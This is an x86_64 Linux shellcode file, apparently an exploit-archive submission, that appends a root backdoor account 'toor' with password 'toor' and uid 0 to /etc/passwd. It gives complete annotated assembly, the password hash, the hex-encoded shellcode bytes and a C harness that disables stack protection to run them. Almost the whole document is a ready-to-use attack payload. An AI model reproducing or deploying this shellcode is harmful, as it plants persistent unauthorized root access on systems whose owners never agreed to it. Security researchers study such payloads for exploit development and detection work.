; Title: add root user (toor:toor)
; Date: 20180811
; Author: epi <epibar052@gmail.com>
;   https://epi052.gitlab.io/notes-to-self/
; Tested on: linux/x86_64 (SMP CentOS-7 3.10.0-862.2.3.el7.x86_64 GNU/Linux)
;
; Shellcode Length: 99 bytes
; Action: Adds a user into /etc/passwd with the following information
;           username:   toor
;           password:   toor
;           uid:        0
;           gid:        0
;           home:       /root
;           shell:      /bin/sh
;
;           toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh

global _start

section .text
_start:
    ; #define __NR_open 2
    ; int open(const char *pathname, int flags);
    ; rax -> 2
    ; rdi -> /etc/passwd
    ; rsi -> 0x401
    ;
    ; >>> hex(os.O_WRONLY ^ os.O_APPEND)
    ; 0x401
    xor ebx, ebx
    mul ebx                         ; rax|rdx -> 0x0
    push rax
    mov ebx, 0x647773ff             ; swd
    shr ebx, 0x08
    push rbx
    mov rbx, 0x7361702f6374652f     ; /etc/pas
    push rbx
    mov rdi, rsp                    ; rdi -> /etc/passwd
    xchg esi, edx                   ; swap registers to zero out rsi
    mov si, 0x401                   ; rsi -> O_WRONLY|O_APPEND
    add al, 0x2                     ; rax -> 2 (open)
    syscall                         ; open

    xchg rdi, rax                   ; save returned fd

    jmp short get_entry_address     ; start jmp-call-pop

write_entry:
    ; #define __NR_write 1
    ; ssize_t write(int fd, const void *buf, size_t count);
    ; rax -> 1
    ; rdi -> results of open syscall
    ; rsi -> user's entry
    ; rdx -> len of user's entry
    pop rsi                         ; end jmp-call-pop, rsi -> user's entry
    push 0x1
    pop rax                         ; rax -> 1
    push 38                         ; length + 1 for newline
    pop rdx                         ; rdx -> length of user's entry
    syscall                         ; write

    ; #define __NR_exit 60
    ; void _exit(int status);
    ; rax -> 60
    ; rdi -> don't care
    push 60
    pop rax
    syscall                         ; OS will handle closing fd at exit

get_entry_address:
    call write_entry
    user_entry: db "toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh",0xa
    ; if the user_entry above is modified, change the _count_ argument in the write call to match the new length
    ; openssl passwd -crypt
    ; Password: toor
    ; Verifying - Password: toor
    ; sXuCKi7k3Xh/s

; Skeleton for testing
;
; gcc -fno-stack-protector -z execstack shellcode-skeleton.c -o shellcode-skeleton
;
; #include <stdio.h>
; #include <string.h>
;
; unsigned char shellcode[] = \
; "\x31\xdb\xf7\xe3\x50\xbb\xff\x73\x77\x64\xc1\xeb\x08\x53\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x53\x48\x89\xe7\x87\xf2\x66\xbe\x01\x04\x04\x02\x0f\x05\x48\x97\xeb\x0e\x5e\x6a\x01\x58\x6a\x26\x5a\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xed\xff\xff\xff\x74\x6f\x6f\x72\x3a\x73\x58\x75\x43\x4b\x69\x37\x6b\x33\x58\x68\x2f\x73\x3a\x30\x3a\x30\x3a\x3a\x2f\x72\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x73\x68\x0a";
;
; int main() {
;   printf("Shellcode length: %zu\n", strlen(shellcode));
;   int (*ret)() = (int(*)())shellcode;
;   ret();
; }